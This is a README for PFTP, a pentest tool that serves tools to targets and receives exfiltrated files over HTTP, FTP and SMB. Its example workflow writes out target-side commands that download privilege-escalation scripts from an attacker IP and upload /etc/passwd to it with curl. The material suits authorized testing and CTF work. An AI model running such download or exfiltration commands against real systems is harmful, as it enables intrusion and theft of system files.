# PFTP - Pentest File Transfer Protocols

A lightweight, multi-protocol file transfer hub for penetration testers, ethical hackers, and CTF players. PFTP serves tools and receives exfiltrated data over HTTP, FTP, and SMB simultaneously with a web UI for browsing, uploading, and generating download commands.

[![PyPI](https://img.shields.io/pypi/v/pftp)](https://pypi.org/project/pftp/)
[![Docker](https://img.shields.io/docker/v/ahmadalawneh3/pftp?label=docker)](https://hub.docker.com/r/ahmadalawneh3/pftp)
[![License](https://img.shields.io/github/license/AhmadAlawneh3/PFTP)](LICENSE)

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Commands](#commands)
- [Configuration](#configuration)
- [Security Notice](#security-notice)
- [License](#license)

## Features

- **Multi-Protocol**: HTTP, FTP, and SMB servers running simultaneously
- **Web UI**: Browse tools, upload files, and copy download commands with one click
- **Command Generation**: PowerShell, wget, curl, bitsadmin, and base64-encoded commands
- **Network Detection**: Auto-detects interfaces
- **File Upload/Exfiltration**: Receive files via web UI or command line
- **Live Activity Logs**: Real-time monitoring of downloads and uploads
- **Authentication**: Optional auth across all protocols
- **CLI Management**: Simple commands to install, configure, and manage
- **Docker-Based**: Consistent environment, one-command deployment

## Installation

**Prerequisites:**
- Python 3.8+
- Docker

**Install with pip:**
```bash
pip install pftp
```

**Or with pipx (recommended):**
```bash
pipx install pftp
```

## Usage

### 1. Initial Setup

Install and configure PFTP with the interactive wizard:

```bash
pftp install
```

The wizard will guide you through:
- Directory configuration
- Protocol selection (HTTP, FTP, SMB)
- Authentication settings
- Docker restart policy

After installation, the server starts automatically.

### 2. Adding Tools

Add single files:
```bash
pftp add-tool ~/tools/linpeas.sh
```

Add files with categorization:
```bash
pftp add-tool ~/tools/linpeas.sh --category linux
pftp add-tool ~/tools/winPEAS.exe --category windows
```

Add directories recursively:
```bash
pftp add-tool ~/tools/windows-tools/ --recursive --category windows
```

### 3. Accessing the Server

Once running, access the web UI at `http://<your-ip>:1234`:

- **Tools Tab**: Browse tools hierarchically, search, and copy platform-specific download commands
- **Upload Tab**: Receive files via drag-and-drop or browse upload, with source IP tracking
- **Activity Log**: Live feed of all downloads and uploads

### Example Workflow

**On your attack machine:**
```bash
pftp install
pftp add-tool ~/tools/linpeas.sh --category linux
pftp add-tool ~/tools/winPEAS.exe --category windows
# Server starts automatically after install
```

**On target (Linux):**
```bash
wget http://10.10.14.5:1234/tools/linux/linpeas.sh -O linpeas.sh
```

**On target (Windows PowerShell):**
```powershell
IWR -Uri "http://10.10.14.5:1234/tools/windows/winPEAS.exe" -OutFile "winPEAS.exe"
```

**Upload from target:**
```bash
curl -F "file=@/etc/passwd" http://10.10.14.5:1234/upload
```

**FTP access:**
```bash
ftp 10.10.14.5
```

**SMB access (Windows):**
```cmd
net use \\10.10.14.5\tools
copy \\10.10.14.5\tools\windows\winPEAS.exe .
```

## Commands

| Command | Description |
|---------|-------------|
| `pftp install` | Install and configure PFTP (interactive wizard) |
| `pftp start` | Start the server |
| `pftp stop` | Stop the server |
| `pftp restart` | Restart the server |
| `pftp status` | Show server status and configuration |
| `pftp configure` | Reconfigure settings (interactive or via flags) |
| `pftp add-tool <path>` | Add files/directories to tools |
| `pftp logs` | View server logs (live by default) |
| `pftp update` | Update to latest version |
| `pftp remove` | Uninstall PFTP |
| `pftp version` | Show version information |

### Non-Interactive Mode

All options can be passed as flags for scripting:

```bash
pftp install --yes --http-port 8080 --enable-ftp --disable-smb
pftp configure --auth --auth-username admin --auth-password secret
pftp configure --restart-policy always
```

### Add-Tool Options

```bash
pftp add-tool <file>                    # Add single file
pftp add-tool <file> --category linux   # Add to subdirectory
pftp add-tool <dir> --recursive         # Add directory recursively
```

## Configuration

Configuration is stored in `~/.pftp/config/config.yaml` and managed via the CLI.

### Protocols

| Protocol | Default Port | Purpose |
| -------- | ------------ | ------- |
| HTTP | 1234 | Web UI, file download/upload, command generation |
| FTP | 21 | Anonymous FTP access to tools |
| SMB | 445 | Windows-native file sharing |

Enable/disable protocols individually:
```bash
pftp configure --enable-ftp --disable-smb
```

### Authentication

Optional authentication protects the web UI and download endpoints. The upload endpoint remains open so targets can upload files without credentials.

```bash
pftp configure --auth --auth-username admin --auth-password mysecret
```

When enabled, the web UI includes credentials in generated download commands automatically.

### Docker Restart Policy

Configure automatic restart behavior:
```bash
pftp configure --restart-policy always
```

Options: `no`, `always`, `unless-stopped` (default), `on-failure`

### Directory Structure

```
~/.pftp/
├── config/
│   └── config.yaml       # Configuration
├── tools/                 # Your pentest tools
│   ├── linux/
│   ├── windows/
│   └── exploits/
└── uploads/               # Received files from targets
```

## Security Notice

⚠️ **Important Security Considerations**

- **Authorized use only** - designed for penetration testing, CTF, and lab environments
- **Not for production** - this is a testing tool
- **HTTP only** - traffic is unencrypted, use on VPN or isolated networks
- **Upload endpoint is open** - intentionally unauthenticated so targets can upload

## License

MIT License - see [LICENSE](LICENSE) for details.

## Author

Ahmad Alawneh  
GitHub: [AhmadAlawneh3/PFTP](https://github.com/AhmadAlawneh3/PFTP)  
Docker Hub: [ahmadalawneh3/pftp](https://hub.docker.com/r/ahmadalawneh3/pftp)
